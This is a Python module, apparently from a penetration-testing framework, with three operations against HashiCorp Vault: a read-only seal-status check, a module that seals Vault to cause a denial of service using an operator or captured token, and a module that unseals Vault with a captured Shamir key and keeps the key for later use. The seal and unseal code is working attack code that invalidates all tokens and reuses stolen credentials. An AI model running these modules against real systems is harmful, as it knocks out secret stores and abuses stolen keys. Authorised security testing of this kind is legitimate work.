"""Vault seal/unseal manipulation module.

Supports three operations:
- ``seal_status``  — read-only check (no token needed)
- ``seal_vault``   — seal Vault (requires token with sys/seal access)
- ``unseal_vault`` — unseal Vault (requires the Shamir unseal key, no token)
"""

from typing import Optional, Dict, Any, List
import requests

from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel
from core.tls_config import get_verify


TIMEOUT = 10

# ── Base module (read-only status) ──────────────────────────────────────────


class SealStatusModule(BaseExecutionModule):
    """Read-only: check whether Vault is currently sealed."""

    def __init__(self):
        super().__init__(
            module_id="vault_seal.seal_status",
            title="Vault Seal Status",
            risk_level=RiskLevel.READ_ONLY,
            domain="seal",
            description="Check whether the target Vault instance is sealed or unsealed.",
            default_enabled=True,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(getattr(context, "vault_addr", None))

    def execute(
        self, context: ExecutionContext, params: Optional[dict] = None
    ) -> ExecutionResult:
        vault_addr = getattr(context, "vault_addr", "")
        url = f"{vault_addr.rstrip('/')}/v1/sys/seal-status"
        try:
            resp = requests.get(url, timeout=TIMEOUT, verify=get_verify())
            data = resp.json()
            sealed = data.get("sealed", None)
            return ExecutionResult(
                status="success",
                message=f"Vault is {'SEALED' if sealed else 'UNSEALED'}",
                evidence={"sealed": sealed, "raw": data},
            )
        except requests.RequestException as exc:
            return ExecutionResult(
                status="error", message=f"Seal status check failed: {exc}",
                evidence={"error": str(exc)},
            )


# ── Seal module ──────────────────────────────────────────────────────────────


class SealVaultModule(BaseExecutionModule):
    """Seal Vault — causes denial of service until unsealed."""

    def __init__(self):
        super().__init__(
            module_id="vault_seal.seal_vault",
            title="Seal Vault (DoS)",
            risk_level=RiskLevel.STATE_CHANGING,
            domain="seal",
            description=(
                "SEAL the target Vault instance. All tokens become invalid, "
                "all secrets engines stop, Vault is completely unavailable "
                "until manually unsealed. USE WITH CAUTION."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(
            getattr(context, "vault_addr", None)
            and (getattr(context, "token", None) or getattr(context, "captured_token", None))
        )

    def execute(
        self, context: ExecutionContext, params: Optional[dict] = None
    ) -> ExecutionResult:
        vault_addr = getattr(context, "vault_addr", "")
        token = getattr(context, "token", None) or getattr(context, "captured_token", None)
        url = f"{vault_addr.rstrip('/')}/v1/sys/seal"
        headers = {"X-Vault-Token": token}

        try:
            resp = requests.put(url, headers=headers, timeout=TIMEOUT, verify=get_verify())
            if resp.status_code in (200, 204):
                context.add_finding(
                    title="CRITICAL: Vault Sealed (Denial of Service)",
                    description=(
                        "The target Vault has been sealed. All tokens are now "
                        "invalid and all secrets engines are stopped. Vault will "
                        "remain unavailable until manually unsealed."
                    ),
                    severity="CRITICAL",
                    evidence={"action": "seal", "status_code": resp.status_code},
                )
                return ExecutionResult(
                    status="success",
                    message="Vault sealed successfully — DoS achieved.",
                    evidence={"status_code": resp.status_code},
                )
            return ExecutionResult(
                status="failed",
                message=f"Seal failed: HTTP {resp.status_code}",
                evidence={"status_code": resp.status_code, "response": resp.text[:500]},
            )
        except requests.RequestException as exc:
            return ExecutionResult(
                status="error", message=f"Seal request failed: {exc}",
                evidence={"error": str(exc)},
            )


# ── Unseal module ────────────────────────────────────────────────────────────


class UnsealVaultModule(BaseExecutionModule):
    """Unseal Vault using a Shamir key share."""

    def __init__(self):
        super().__init__(
            module_id="vault_seal.unseal_vault",
            title="Unseal Vault",
            risk_level=RiskLevel.STATE_CHANGING,
            domain="seal",
            description=(
                "UNSEAL Vault using a Shamir unseal key. No token required — "
                "only the unseal key is needed. Pass the key via params: "
                "{'unseal_key': 'base64key...'}. If Vault is already unsealed "
                "this is a no-op."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(getattr(context, "vault_addr", None))

    def execute(
        self, context: ExecutionContext, params: Optional[dict] = None
    ) -> ExecutionResult:
        vault_addr = getattr(context, "vault_addr", "")
        params = params or {}
        unseal_key = params.get("unseal_key") or getattr(context, "unseal_key", None)

        if not unseal_key:
            return ExecutionResult(
                status="error",
                message="No unseal key provided. Pass it via params: {'unseal_key': '...'}",
                evidence={"missing": ["unseal_key"]},
            )

        url = f"{vault_addr.rstrip('/')}/v1/sys/unseal"
        try:
            resp = requests.put(
                url, json={"key": unseal_key}, timeout=TIMEOUT, verify=get_verify()
            )
            data = resp.json()
            sealed = data.get("sealed", True)
            progress = data.get("progress", 0)
            threshold = data.get("t", 0)

            if not sealed:
                context.add_finding(
                    title="Vault Unsealed",
                    description=(
                        "Vault was unsealed using a captured Shamir key. "
                        "Full Vault access has been restored."
                    ),
                    severity="HIGH",
                    evidence={"action": "unseal", "progress": progress, "threshold": threshold},
                )
                # Store the key in context for later use
                setattr(context, "unseal_key", unseal_key)
                return ExecutionResult(
                    status="success",
                    message=f"Vault unsealed ({progress}/{threshold} shares provided).",
                    evidence={"sealed": False, "progress": progress, "threshold": threshold},
                )
            else:
                return ExecutionResult(
                    status="success",
                    message=f"Unseal progress: {progress}/{threshold} shares. More keys needed.",
                    evidence={"sealed": True, "progress": progress, "threshold": threshold},
                )
        except requests.RequestException as exc:
            return ExecutionResult(
                status="error", message=f"Unseal request failed: {exc}",
                evidence={"error": str(exc)},
            )
